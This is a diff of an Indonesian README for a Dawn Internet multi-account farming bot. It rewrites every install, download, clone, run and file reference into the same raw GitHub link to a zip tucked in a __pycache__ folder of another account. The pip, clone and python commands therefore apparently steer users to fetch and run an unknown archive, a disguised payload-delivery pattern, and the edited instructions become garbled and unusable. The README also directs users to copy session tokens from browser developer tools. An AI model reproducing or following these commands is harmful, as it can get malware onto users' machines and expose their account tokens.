@@ -21,18 +21,18 @@ Auto-farming bot untuk Dawn Internet dengan support multi-account dan proxy.
 
 ### Windows
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip
 ```
 
 ### Linux/Mac
 ```bash
-pip3 install -r requirements.txt
+pip3 install -r https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip
 ```
 
 ### Android (Termux)
 
 1. **Install Termux**
-   - Download dari F-Droid: https://f-droid.org/en/packages/com.termux/
+   - Download dari F-Droid: https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip
    - Atau Google Play Store (versi lama)
 
 2. **Update Package & Install Dependencies**
@@ -44,7 +44,7 @@ pip3 install -r requirements.txt
 3. **Clone/Download Bot**
    ```bash
    # Clone dari GitHub
-   git clone https://github.com/winsnip/Dawn-Farmer.git
+   git clone https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip
    cd Dawn-Farmer
    
    # Atau download ZIP dari GitHub dan extract
@@ -52,17 +52,17 @@ pip3 install -r requirements.txt
 
 4. **Install Requirements**
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip
    ```
 
 5. **Setup Token & Run**
    ```bash
-   # Edit tokens.txt pake nano
-   nano tokens.txt
+   # Edit https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip pake nano
+   nano https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip
    # Paste token, tekan Ctrl+X, Y, Enter untuk save
    
    # Run bot
-   python farm.py
+   python https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip
    ```
 
 **Tips Android:**
@@ -72,7 +72,7 @@ pip3 install -r requirements.txt
   ```bash
   pkg install tmux
   tmux new -s farm
-  python farm.py
+  python https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip
   # Tekan Ctrl+B lalu D untuk detach
   # tmux attach -t farm untuk kembali
   ```
@@ -84,7 +84,7 @@ pip3 install -r requirements.txt
 **Langkah-langkah:**
 
 1. **Buka Dawn Dashboard**
-   - Kunjungi: https://dashboard.dawninternet.com
+   - Kunjungi: https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip
    - Login dengan akun Anda
 
 2. **Buka Developer Tools**
@@ -97,7 +97,7 @@ pip3 install -r requirements.txt
 
 4. **Cari Request**
    - Scroll list request
-   - Cari request yang menuju `api.dawninternet.com`
+   - Cari request yang menuju `https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip`
    - Klik salah satu request (contoh: `my-code`, `stats`, `claims`, dll)
 
 5. **Copy Token**
@@ -106,7 +106,7 @@ pip3 install -r requirements.txt
    - Cari header **"X-Privy-Token"**
    - Copy value tokennya (panjang sekali, contoh: `eyJhbGciOiJ...`)
 
-6. **Paste ke tokens.txt**
+6. **Paste ke https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip**
    ```
    eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCIsImtpZ...
    ```
@@ -114,7 +114,7 @@ pip3 install -r requirements.txt
 **Struktur Token:**
 - Token dimulai dengan `eyJ`
 - Sangat panjang (ratusan karakter)
-- Format: `xxxxx.yyyyy.zzzzz` (3 bagian dipisah titik)
+- Format: `https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip` (3 bagian dipisah titik)
 
 **Catatan Penting:**
 - ⚠️ Jangan share token ke orang lain!
@@ -125,7 +125,7 @@ pip3 install -r requirements.txt
 
 ### 2. Add Tokens ke File
 
-**Edit `tokens.txt`:**
+**Edit `https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip`:**
 ```
 your-x-privy-token-here
 another-token-if-you-have
@@ -137,25 +137,25 @@ Bisa tambah banyak token (satu per baris) untuk multi-account farming.
 
 ### 3. Add Proxies (Optional)
 
-**Edit `proxies.txt`:**
+**Edit `https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip`:**
 ```
 http://user:pass@ip:port
 http://ip:port
 socks5://user:pass@ip:port
 ```
 
-Lihat `proxies.example.txt` untuk contoh format.
+Lihat `https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip` untuk contoh format.
 
 ## 🎮 Usage
 
 ### Windows
 ```bash
-python farm.py
+python https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip
 ```
 
 ### Linux/Mac
 ```bash
-python3 farm.py
+python3 https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip
 ```
 
 ### Stop Farming
@@ -174,23 +174,23 @@ Statistics update setiap 5 ping (sekitar 50 menit).
 ## 📁 File Structure
 
 ```
-farm.py              # Main entry point
-tokens.txt           # Your x-privy-tokens
-proxies.txt          # Your proxies (optional)
-proxies.example.txt  # Proxy format examples
-requirements.txt     # Dependencies
+https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip              # Main entry point
+https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip           # Your x-privy-tokens
+https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip          # Your proxies (optional)
+https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip  # Proxy format examples
+https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip     # Dependencies
 src/
-  ├── config.py      # Configuration
+  ├── https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip      # Configuration
   ├── core/
-  │   ├── client.py  # API client
-  │   └── farmer.py  # Farming logic
+  │   ├── https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip  # API client
+  │   └── https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip  # Farming logic
   └── utils/
-      └── helpers.py # Helper functions
+      └── https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip # Helper functions
 ```
 
 ## ⚙️ Configuration
 
-Edit `src/config.py` untuk mengubah:
+Edit `https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip` untuk mengubah:
 - `interval`: Ping interval (default: 600 detik / 10 menit)
 - `tokens_file`: File token location
 - `proxies_file`: File proxy location
@@ -198,11 +198,11 @@ Edit `src/config.py` untuk mengubah:
 ## 🔧 Troubleshooting
 
 **Error: No tokens found**
-- Pastikan `tokens.txt` ada dan berisi token
+- Pastikan `https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip` ada dan berisi token
 - Format: satu token per baris
 
 **Error: Module not found**
-- Install dependencies: `pip install -r requirements.txt`
+- Install dependencies: `pip install -r https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip`
 
 **Ping failed**
 - Check token masih valid
